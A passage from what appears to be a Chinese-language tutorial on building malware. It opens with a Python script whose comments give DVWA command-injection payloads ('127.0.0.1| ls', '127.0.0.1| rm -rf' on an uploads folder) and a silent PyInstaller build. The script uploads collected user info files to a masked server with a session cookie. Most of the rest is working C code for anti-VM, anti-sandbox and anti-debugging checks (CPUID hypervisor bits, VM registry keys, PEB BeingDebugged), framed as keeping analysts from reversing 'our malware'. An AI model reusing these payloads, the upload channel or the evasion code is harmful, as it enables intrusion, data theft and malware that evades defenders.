venv\Scripts\activate</span></span><br><span class="line">    <span class="comment">#     3. pip install -r requirements.txt</span></span><br><span class="line">    <span class="comment">#     4. pyinstaller --onefile --noconsole --clean --strip box.py</span></span><br><span class="line">    <span class="comment"># 信息下载</span></span><br><span class="line">    <span class="comment">#     1. dvwa: host/vulnerabilities/exec/#</span></span><br><span class="line">    <span class="comment">#     2. 127.0.0.1| ls ../../hackable/uploads/</span></span><br><span class="line">    <span class="comment">#     3. 访问: http://&#123;host&#125;/hackable/uploads/&#123;user&#125;---info.txt</span></span><br><span class="line">    <span class="comment">#     4. 删除 127.0.0.1| rm -rf ../../hackable/uploads/&#123;user&#125;---info.txt</span></span><br><span class="line">    <span class="comment">#     5. 再次确认是否删除 127.0.0.1| ls ../../hackable/uploads/</span></span><br><span class="line">    upload_file(<span class="string">&#x27;http://***.***.***.***/vulnerabilities/upload/&#x27;</span>,</span><br><span class="line">                         <span class="string">&#x27;PHPSESSID=0c64j18co158fig75btom3icr3; security=low&#x27;</span>, main())</span><br></pre></td></tr></table></figure>

<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202411071301085.png" data-fancybox="true"/></div></div>

<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202411071301181.png" data-fancybox="true"/></div></div>

<h2 id="反调试"><a href="#反调试" class="headerlink" title="反调试"></a>反调试</h2><p>反虚拟化是指检测恶意软件是否运行在虚拟机&#x2F;沙盒上而不是物理机器上，这可以通过多种方式完成：</p>
<ul>
<li>检查屏幕分辨率：如果你在一个自动沙盒上，一些简单的指标，如屏幕分辨率可能会让你放弃。</li>
<li>检查I&#x2F;O设备（鼠标，键盘等）：自动沙盒不会有I&#x2F;O设备，因为它们不用于日常机器或虚拟机，它们仅用于分析恶意软件。</li>
<li>检查正在运行的进程或系统上的文件：简单地枚举机器上当前正在运行的进程将给你提示，如果它是一个只运行默认进程的沙箱，或者是一个具有许多基本使用应用程序的实际机器。</li>
<li>使用<a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/win32/api/sysinfoapi/nf-sysinfoapi-gettickcount">GetTickCount（）</a>用于确定PE是否正在调试,通过确定运行二进制文件所需的时间并在执行过程中重新检查它.您可以查看是否有断点延迟执行:添加两个任意<code>GetTickCount()</code>函数,存储T并硬编码.<ul>
<li>T是您的程序从第一个函数调用到第二个函数调用的时间，假设为50秒。然后，您可以在目标机器上执行恶意软件时添加检查，如果T超过50秒，这意味着有人可能正在调试您的exe。（您可能会为不同处理器之间的性能差异添加误差幅度）</li>
</ul>
</li>
</ul>
<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202411071301302.png" data-fancybox="true"/></div></div>

<h3 id="Cpuid"><a href="#Cpuid" class="headerlink" title="Cpuid"></a>Cpuid</h3><p><a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/cpp/intrinsics/cpuid-cpuidex?view=msvc-170">__Cpuid()</a>:这是一个函数，如果检测到Hypervisor供应商，它将为我们提供有关Hypervisor供应商的信息</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;intrin.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">getCpuInfo</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// cpuInfo数组现在包含CPU的基本信息</span></span><br><span class="line">    <span class="comment">// cpuInfo[0] - EAX寄存器内容</span></span><br><span class="line">    <span class="comment">// cpuInfo[1] - EBX寄存器内容</span></span><br><span class="line">    <span class="comment">// cpuInfo[2] - ECX寄存器内容</span></span><br><span class="line">    <span class="comment">// cpuInfo[3] - EDX寄存器内容</span></span><br><span class="line">    <span class="type">int</span> cpuInfo[<span class="number">4</span>];  <span class="comment">// 用于存储CPUID指令的返回值</span></span><br><span class="line">    __cpuid(cpuInfo, <span class="number">0</span>);  <span class="comment">// 执行CPUID指令并获取信息    </span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ol>
<li>参数1是一个整型数组，通常有四个元素，用于存储从EAX、EBX、ECX和EDX寄存器返回的值。</li>
<li>参数2是一个整数，用于指定要查询的 CPUID 信息的功能参数（即功能号）<ol>
<li>0:  返回最大支持的功能号，以及厂商ID字符串。</li>
<li>1:  返回处理器的版本信息、特征标志等。</li>
</ol>
</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">CheckCpuid1</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 用于存储CPUID指令返回的信息</span></span><br><span class="line">    <span class="type">int</span> cpuinfo[<span class="number">4</span>]; </span><br><span class="line">    <span class="comment">// 调用CPUID指令，使用功能号1，获取处理器信息</span></span><br><span class="line">    __cpuid(cpuinfo, <span class="number">1</span>);</span><br><span class="line">    <span class="comment">// 检查ECX寄存器的第31位是否被设置</span></span><br><span class="line">    <span class="type">int</span> bit = (cpuinfo[<span class="number">2</span>] &gt;&gt; <span class="number">31</span> &amp; <span class="number">1</span>); </span><br><span class="line">    <span class="keyword">if</span> (bit) <span class="comment">// 如果第31位被设置</span></span><br><span class="line">    &#123;   </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] cpuid 第 31 bit 被设置为 1,检测到虚拟处理器\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> TRUE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// CPUID.01h.ECX:31</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果我们将leef从0x1更改为<a target="_blank" rel="noopener" href="https://knowledge.broadcom.com/external/article/340368/mechanisms-to-determine-if-software-is-r.html">0x40000000</a>，我们将获得供应商信息。</p>
<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202411071301545.png" data-fancybox="true"/></div></div>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">CheckCpuid2</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> cpuinfo[<span class="number">4</span>]; <span class="comment">// 用于存储CPUID指令返回的信息</span></span><br><span class="line">    __cpuid(cpuinfo, <span class="number">0x40000000</span>); <span class="comment">// 调用CPUID指令，使用功能号0x40000000，获取虚拟化厂商的签名</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 超级管理程序厂商签名存储在cpuinfo的1、2、3号索引中</span></span><br><span class="line">    <span class="type">char</span> vendor[<span class="number">13</span>]; <span class="comment">// 用于存储厂商字符串</span></span><br><span class="line">    <span class="built_in">memcpy</span>(vendor, &amp;cpuinfo[<span class="number">1</span>], <span class="number">4</span>); <span class="comment">// 复制信息到vendor</span></span><br><span class="line">    <span class="built_in">memcpy</span>(vendor + <span class="number">4</span>, &amp;cpuinfo[<span class="number">2</span>], <span class="number">4</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(vendor + <span class="number">8</span>, &amp;cpuinfo[<span class="number">3</span>], <span class="number">4</span>);</span><br><span class="line">    vendor[<span class="number">12</span>] = <span class="string">&#x27;\0&#x27;</span>; <span class="comment">// 设置字符串结束符</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\t虚拟机管理程序供应商: %s\n&quot;</span>, vendor); <span class="comment">// 打印虚拟化厂商签名</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最终函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;intrin.h&gt;</span>  <span class="comment">// 用于使用 __cpuid</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line">BOOL <span class="title function_">CheckCpuid</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> cpuinfo[<span class="number">4</span>];  <span class="comment">// 用于存储CPUID指令返回的信息</span></span><br><span class="line">    <span class="comment">// 第一次调用 CPUID 指令，使用功能号 1，获取处理器信息</span></span><br><span class="line">    __cpuid(cpuinfo, <span class="number">1</span>);</span><br><span class="line">    <span class="comment">// 检查 ECX 寄存器的第 31 位是否被设置</span></span><br><span class="line">    <span class="type">int</span> bit = (cpuinfo[<span class="number">2</span>] &gt;&gt; <span class="number">31</span>) &amp; <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (bit) &#123;  <span class="comment">// 如果第 31 位被设置</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] cpuid 第 31 bit 被设置为 1, 检测到虚拟处理器\n&quot;</span>);</span><br><span class="line">        <span class="comment">// 第二次调用 CPUID 指令，使用功能号 0x40000000，获取虚拟化厂商的签名</span></span><br><span class="line">        __cpuid(cpuinfo, <span class="number">0x40000000</span>);</span><br><span class="line">        <span class="comment">// 超级管理程序厂商签名存储在 cpuinfo 的 1、2、3 号索引中</span></span><br><span class="line">        <span class="type">char</span> vendor[<span class="number">13</span>];  <span class="comment">// 用于存储厂商字符串</span></span><br><span class="line">        <span class="built_in">memcpy</span>(vendor, &amp;cpuinfo[<span class="number">1</span>], <span class="number">4</span>);  <span class="comment">// 复制信息到 vendor</span></span><br><span class="line">        <span class="built_in">memcpy</span>(vendor + <span class="number">4</span>, &amp;cpuinfo[<span class="number">2</span>], <span class="number">4</span>);</span><br><span class="line">        <span class="built_in">memcpy</span>(vendor + <span class="number">8</span>, &amp;cpuinfo[<span class="number">3</span>], <span class="number">4</span>);</span><br><span class="line">        vendor[<span class="number">12</span>] = <span class="string">&#x27;\0&#x27;</span>;  <span class="comment">// 设置字符串结束符</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;虚拟机管理程序供应商: %s\n&quot;</span>, vendor);  <span class="comment">// 打印虚拟化厂商签名</span></span><br><span class="line">        <span class="keyword">return</span> TRUE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 如果没有检测到虚拟处理器，返回 FALSE</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[-] 未检测到虚拟处理器\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    CheckCpuid();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="注册表"><a href="#注册表" class="headerlink" title="注册表"></a>注册表</h3><ul>
<li>HyperV : <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Virtual Machine\Guest\Parameters</code></li>
</ul>
<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202411071301694.png" data-fancybox="true"/></div></div>

<p>在hostname和Physical Hostname中，您可以找到物理主机名和主机的域名。</p>
<ul>
<li>VirtualBox：对于<code>VirtualBox</code>，只有在使用<code>VirtualBox</code>的客户机上才能找到注册表项<code>HKEY_LOCAL_MACHINE\HARDWARE\ACPI\DSDT\VBOX__</code></li>
</ul>
<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202411071301853.png" data-fancybox="true"/></div></div>

<p>VMware：<code>HKEY_LOCAL_MACHINE\SOFTWARE\VMware, Inc.\VMware Tools</code></p>
<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202411071301704.png" data-fancybox="true"/></div></div>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line">BOOL <span class="title function_">CheckHypervisor</span><span class="params">()</span> &#123;</span><br><span class="line">    HKEY hkey;  <span class="comment">// 用于存储打开注册表项的句柄</span></span><br><span class="line">    LONG Result;  <span class="comment">// 用于存储注册表操作的返回值</span></span><br><span class="line">    BYTE data[<span class="number">256</span>], data2[<span class="number">256</span>];  <span class="comment">// 用于存储从注册表中查询的值</span></span><br><span class="line">    DWORD dataSize = <span class="keyword">sizeof</span>(data);  <span class="comment">// 存储数据大小，用于查询注册表值时用</span></span><br><span class="line">    DWORD dwType = REG_SZ;  <span class="comment">// 指定注册表值的数据类型（字符串类型）</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查是否在 Hyper-V 中运行</span></span><br><span class="line">    Result = RegOpenKeyExA(HKEY_LOCAL_MACHINE, <span class="string">&quot;SOFTWARE\\Microsoft\\Virtual Machine\\Guest\\Parameters&quot;</span>, <span class="number">0</span>, KEY_READ | KEY_WOW64_64KEY, &amp;hkey);</span><br><span class="line">    <span class="keyword">if</span> (Result == ERROR_SUCCESS) &#123;</span><br><span class="line">        <span class="comment">// 如果能够成功打开注册表项，表示在 Hyper-V 中运行</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] 当前运行在 Hyper-V 虚拟机中\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 查询虚拟机名称</span></span><br><span class="line">        Result = RegQueryValueExA(hkey, <span class="string">&quot;VirtualMachineName&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, data, &amp;dataSize);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] 虚拟机名称: %s\n&quot;</span>, (<span class="type">unsigned</span> <span class="type">char</span>*)data);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 查询主机名</span></span><br><span class="line">        Result = RegQueryValueExA(hkey, <span class="string">&quot;HostName&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, data2, &amp;dataSize);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] 主机名: %s\n&quot;</span>, (<span class="type">unsigned</span> <span class="type">char</span>*)data2);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 查询物理宿主机的完全限定名称</span></span><br><span class="line">        Result = RegGetValueA(hkey, <span class="literal">NULL</span>, <span class="string">&quot;PhysicalHostNameFullyQualified&quot;</span>, RRF_RT_REG_SZ, &amp;dwType, data2, &amp;dataSize);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] 物理宿主机名字: %s\n&quot;</span>, (<span class="type">unsigned</span> <span class="type">char</span>*)data2);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 关闭注册表项句柄</span></span><br><span class="line">        RegCloseKey(hkey);</span><br><span class="line">        <span class="comment">// 返回 TRUE 表示检测到虚拟化软件</span></span><br><span class="line">        <span class="keyword">return</span> TRUE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查是否在 VirtualBox 中运行</span></span><br><span class="line">    Result = RegOpenKeyExA(HKEY_LOCAL_MACHINE, <span class="string">&quot;HARDWARE\\ACPI\\DSDT\\VBOX__&quot;</span>, <span class="number">0</span>, KEY_READ | KEY_WOW64_64KEY, &amp;hkey);</span><br><span class="line">    <span class="keyword">if</span> (Result == ERROR_SUCCESS) &#123;</span><br><span class="line">        <span class="comment">// 如果能够成功打开注册表项，表示在 VirtualBox 中运行</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] 当前运行在 VirtualBox 虚拟机中\n&quot;</span>);</span><br><span class="line">        RegCloseKey(hkey);</span><br><span class="line">        <span class="keyword">return</span> TRUE;</span><br><span class="line">    &#125;</span><br><span class="line">    RegCloseKey(hkey);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查是否在 VMware 中运行</span></span><br><span class="line">    Result = RegOpenKeyExA(HKEY_LOCAL_MACHINE, <span class="string">&quot;SOFTWARE\\VMware, Inc.\\VMware Tools&quot;</span>, <span class="number">0</span>, KEY_READ | KEY_WOW64_64KEY, &amp;hkey);</span><br><span class="line">    <span class="keyword">if</span> (Result == ERROR_SUCCESS) &#123;</span><br><span class="line">        <span class="comment">// 如果能够成功打开注册表项，表示在 VMware 中运行</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] 当前运行在 VMware 虚拟机中\n&quot;</span>);</span><br><span class="line">        RegCloseKey(hkey);</span><br><span class="line">        <span class="keyword">return</span> TRUE;</span><br><span class="line">    &#125;</span><br><span class="line">    RegCloseKey(hkey);</span><br><span class="line">    <span class="keyword">return</span> FALSE;  <span class="comment">// 如果没有检测到任何虚拟化软件，返回 FALSE</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    CheckHypervisor();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol>
<li><p><strong>RegOpenKeyExA</strong>:</p>
<p><code>RegOpenKeyExA</code> 是 Windows API 中的一个函数，用于打开一个注册表项并获得一个句柄，打开的注册表项可以用来查询或设置值。</p>
<ul>
<li><code>HKEY hKey</code>: 要打开的注册表项的根键。</li>
<li><code>LPCSTR lpSubKey</code>: 要打开的子项的名称。</li>
<li><code>DWORD ulOptions</code>: 保留，通常为 0。</li>
<li><code>REGSAM samDesired</code>: 指定所需的访问权限。</li>
<li><code>PHKEY phkResult</code>: 指向接收打开的注册表项句柄的变量的指针。</li>
</ul>
</li>
<li><p><strong>RegCloseKey</strong>:</p>
<p><code>RegCloseKey</code> 用于关闭打开的注册表项句柄。</p>
<ul>
<li><code>HKEY hKey</code>: 要关闭的注册表项的句柄。</li>
</ul>
</li>
<li><p><strong>RegQueryValueExA</strong>:</p>
<p><code>RegQueryValueExA</code> 用于检索指定注册表项中的某个值。</p>
<ul>
<li><code>HKEY hKey</code>: 包含要检索的值的注册表项的句柄。</li>
<li><code>LPCSTR lpValueName</code>: 要检索的值的名称。</li>
<li><code>LPDWORD lpReserved</code>: 保留，必须为 NULL。</li>
<li><code>LPDWORD lpType</code>: 指向接收值类型的变量的指针。</li>
<li><code>LPBYTE lpData</code>: 指向接收数据的缓冲区的指针。</li>
<li><code>LPDWORD lpcbData</code>: 指向接收数据大小的变量的指针。</li>
</ul>
</li>
<li><p><strong>RegGetValueA</strong>:</p>
<p><code>RegGetValueA</code> 从注册表中检索值。与 <code>RegQueryValueExA</code> 不同，它可以获取嵌套的子项值。</p>
<ul>
<li><code>HKEY hKey</code>: 包含要检索值的注册表项的句柄。</li>
<li><code>LPCSTR lpSubKey</code>: 要打开的子项的名称。</li>
<li><code>LPCSTR lpValue</code>: 要检索的值的名称。</li>
<li><code>DWORD dwFlags</code>: 指定如何检索信息。</li>
<li><code>LPDWORD pdwType</code>: 指向接收值类型的变量的指针。</li>
<li><code>PVOID pvData</code>: 指向接收数据的缓冲区的指针。</li>
<li><code>LPDWORD pcbData</code>: 指向接收数据大小的变量的指针。</li>
</ul>
</li>
</ol>
<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202411071301387.png" data-fancybox="true"/></div></div>

<h3 id="反调试-1"><a href="#反调试-1" class="headerlink" title="反调试"></a>反调试</h3><p>反调试是阻止恶意软件分析师调试&#x2F;逆向我们的恶意软件的行为.</p>
<p>反调试技术，即<code>BeingDebugged</code>，但在讨论这个技术之前，需要先了解一下<code>PEB</code>(<code>Process Environment Block</code>:进程环境块).</p>
<p><code>PEB(Process Environment Block)</code>:</p>
<ul>
<li>PEB是Windows操作系统中的一个数据结构，用于存储关于当前进程状态和环境的信息。每个进程在其自身的地址空间中有一个PEB</li>
<li>PEB包含的信息包括：<ul>
<li>进程加载的模块（DLL）</li>
<li>进程参数（例如命令行参数）</li>
<li>环境变量</li>
<li>进程的运行时数据</li>
<li>以及其他关于进程的元数据</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">PEB</span> &#123;</span></span><br><span class="line">  BYTE Reserved1[<span class="number">2</span>];  <span class="comment">// 保留字段，用于对齐或未来使用</span></span><br><span class="line">  BYTE BeingDebugged;  <span class="comment">// 表示进程是否被调试器调试，0为否，非0为是</span></span><br><span class="line">  BYTE Reserved2[<span class="number">1</span>];  <span class="comment">// 保留字段，用于对齐或未来使用</span></span><br><span class="line">  PVOID Reserved3[<span class="number">2</span>];  <span class="comment">// 保留字段，通常用于指向内部结构或未来扩展</span></span><br><span class="line">  PPEB_LDR_DATA Ldr;  <span class="comment">// 指向加载器数据的指针，包含该进程中加载的模块信息</span></span><br><span class="line">  PRTL_USER_PROCESS_PARAMETERS ProcessParameters;  <span class="comment">// 指向进程参数的指针，包含命令行参数、环境变量等</span></span><br><span class="line">  PVOID Reserved4[<span class="number">3</span>];  <span class="comment">// 保留字段</span></span><br><span class="line">  PVOID AtlThunkSListPtr;  <span class="comment">// 指向线程本地存储的Thunk列表指针</span></span><br><span class="line">  PVOID Reserved5;  <span class="comment">// 保留字段</span></span><br><span class="line">  ULONG Reserved6;  <span class="comment">// 保留字段</span></span><br><span class="line">  PVOID Reserved7;  <span class="comment">// 保留字段</span></span><br><span class="line">  ULONG Reserved8;  <span class="comment">// 保留字段</span></span><br><span class="line">  ULONG AtlThunkSListPtr32;  <span class="comment">// 32位进程的线程本地存储Thunk列表指针</span></span><br><span class="line">  PVOID Reserved9[<span class="number">45</span>];  <span class="comment">// 大量保留字段</span></span><br><span class="line">  BYTE Reserved10[<span class="number">96</span>];  <span class="comment">// 保留字节，用于对齐或未来使用</span></span><br><span class="line">  PPS_POST_PROCESS_INIT_ROUTINE PostProcessInitRoutine;  <span class="comment">// 进程初始化后的回调例程</span></span><br><span class="line">  BYTE Reserved11[<span class="number">128</span>];  <span class="comment">// 保留字节</span></span><br><span class="line">  PVOID Reserved12[<span class="number">1</span>];  <span class="comment">// 保留字段</span></span><br><span class="line">  ULONG SessionId;  <span class="comment">// 当前会话的ID，用于区分不同的用户会话</span></span><br><span class="line">&#125; PEB, *PPEB;</span><br></pre></td></tr></table></figure>

<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202411071301611.png" data-fancybox="true"/></div></div>

